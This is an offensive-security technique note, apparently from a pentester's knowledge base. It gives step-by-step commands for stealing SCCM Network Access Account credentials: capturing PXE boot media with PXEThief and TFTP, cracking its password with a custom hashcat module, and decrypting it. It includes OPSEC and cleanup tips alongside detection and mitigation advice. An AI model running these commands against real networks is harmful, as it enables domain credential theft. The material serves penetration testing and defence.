---
tags:
  - type/technique
  - tactic/TA0006
  - technique/T1547003
  - technique/T1552001
  - stage/initial-access
  - stage/credential-access
  - os/windows
  - tool/pxethief
  - tool/hashcat
  - service/sccm
  - service/pxe
aliases:
  - SCCM PXE Boot Attack
  - PXEThief NAA Credential Theft
  - Crack SCCM PXE Media Password
  - SCCM Task Sequence Credential Harvesting
---

## Technique
___
This technique provides initial access by exploiting the **Pre-Boot Execution Environment (PXE)**, a standard for booting computers over the network. In corporate environments, PXE is commonly used by **System Center Configuration Manager (SCCM)** to deploy operating systems.

An attacker on the local network can masquerade as a new computer requesting a boot image. By capturing the SCCM boot media files, the attacker can perform an offline password cracking attack to decrypt them. A successful decryption reveals sensitive information, most notably the credentials for the **Network Access Account (NAA)** or domain join accounts, which can be used for initial access and privilege escalation within the Active Directory domain.

!!! alert "note"
	The presence of PXE is a common indicator that SCCM is being used as well, but not always



## Prerequisites
___
**Access Level:** An attacker needs to be on the same local network (broadcast domain) as the SCCM PXE-enabled Distribution Point. No prior domain credentials are required.

**System State:**

- A PXE-enabled SCCM Distribution Point must be accessible on the network.
    
- The attacker's machine must be a Windows system to run the required tool, `PXEThief`.
    
- The attacker's machine must be seen as an "Unknown Computer" by SCCM.
    
- A `tftp` client is required to download boot files.
    
- `hashcat` and a custom SCCM hashcat module are needed for password cracking.
    

**Information:** The IP address of the SCCM Distribution Point (DP) is helpful, though it can sometimes be discovered.

## Considerations
___

**Impact**

A successful attack grants the attacker highly valuable credentials. The **Network Access Account** and **Domain Join Account** often have permissions to read from most Active Directory objects and write to computer objects, providing a significant foothold for lateral movement and further exploitation.

**OPSEC**

- Initial PXE/DHCP requests are broadcast traffic and may not appear suspicious.
    
- The `tftp` file transfer is unencrypted and could be flagged by network monitoring.
    
- Subsequent authenticated requests to the SCCM Management Point (MP) originate from an attacker-controlled, unmanaged device, which could be an indicator of compromise if client origins are monitored.

## Identify
___
The primary method for identifying a vulnerable PXE server is to use the `PXEThief` tool. While it has a discovery option, directly targeting a known or suspected SCCM server IP address is more reliable.
[https://github.com/MWR-CyberSec/PXEThief](https://github.com/MWR-CyberSec/PXEThief)

!!! alert "note"
	 PXEThief  should only be used on windows due to the pywin32 dependency, it also works best with python 3.10 

Attempt to autodiscover distribution point IP:
```powershell
python pxethief.py 1 
```

You already know the SCCM server ip (more reliable):
```powershell
python pxethief.py 2 <DISTRIBUTION_POINT_IP>
```
A successful response will provide the file paths for the .boot.var and .boot.bcd files on the server's TFTP share.

## Execution
___
**Step 1: Request Boot Media Paths**

Use PXEThief to coerce the DP into providing the location of the encrypted boot media files.

```powershell
python pxethief.py 2 <IP>
```

This will output the full paths to the `.boot.var` and `.boot.bcd` files.

**Step 2: Download the Encrypted Boot Variable File**

Use the `tftp` client to download the `.boot.var` file from the Distribution Point.

```powershell
tftp -i <DISTRIBUTION_POINT_IP> GET "\\SMSTemp\\<...>.boot.var" "<...>.boot.var"
```

**Step 3: Extract the Hash for Cracking**

Use `PXEThief` with option 5 to process the downloaded `.boot.var` file and generate a crackable hash.

```powershell
python pxethief.py 5 '.\\<...>.boot.var'
```

A specific [hashcat module](https://github.com/MWR-CyberSec/configmgr-cryptderivekey-hashcat-module) must be used to crack the hash. Here is how to install it:

```bash
cd hashcat_pxe/
git clone https://github.com/hashcat/hashcat.git
git clone https://github.com/MWR-CyberSec/configmgr-cryptderivekey-hashcat-module
cp configmgr-cryptderivekey-hashcat-module/module_code/module_19850.c hashcat/src/modules/
cp configmgr-cryptderivekey-hashcat-module/opencl_code/m19850\* hashcat/OpenCL/
cd hashcat
git checkout -b v6.2.5 tags/v6.2.5 # change to 6.2.5
make
```


Then, the hash can be cracked with hashcat's module `19850` and a password wordlist:

```bash
hashcat/hashcat -m 19850 --force -a 0 hashcat/hash /usr/share/wordlists/rockyou.txt
```

**Step 5: Decrypt Media and Extract Credentials**

Use `PXEThief` with option 3, providing the downloaded `.boot.var` file and the cracked password to decrypt the contents and automatically extract credentials.

```powershell
python pxethief.py 3 '.\\<...>.boot.var' "Password123!"
```

The tool will parse the decrypted data and display any found usernames and passwords for accounts like the NAA.

## Cleanup Considerations
___
- Delete all downloaded artifacts from the attack machine, including the `.boot.var`, `.boot.bcd`, `variables.xml`, and the exported `.pfx` certificate file.
    
- Remove the client certificate imported by `PXEThief` from the Windows Certificate Store.

## Detection & Mitigation
___
#### **Detection**

- **Network Monitoring:** Monitor for unusual `tftp` traffic or a high volume of PXE boot requests from a single source.
    
- **Log Analysis:** Audit SCCM and domain controller logs for authentication events tied to the Network Access Account originating from unexpected or unmanaged IP addresses.
    
- **Endpoint Monitoring:** Look for the execution of `PXEThief.py` or `tftp.exe` on non-administrative workstations.
    

#### **Mitigation**

- **Strong Passwords:** Protect the PXE boot media with a **strong, complex, and long password**. This makes offline cracking significantly more difficult and time-consuming.
    
- **Least Privilege:** Strictly enforce the principle of least privilege for the Network Access Account and any domain join accounts. They should have the absolute minimum permissions required to function.
    
- **Network Segmentation:** Use VLANs and firewall rules to restrict which network segments can communicate with SCCM Distribution Points on required ports (e.g., DHCP, TFTP).
    
- **Regular Audits:** Regularly audit and rotate the credentials used for PXE boot and within Task Sequences.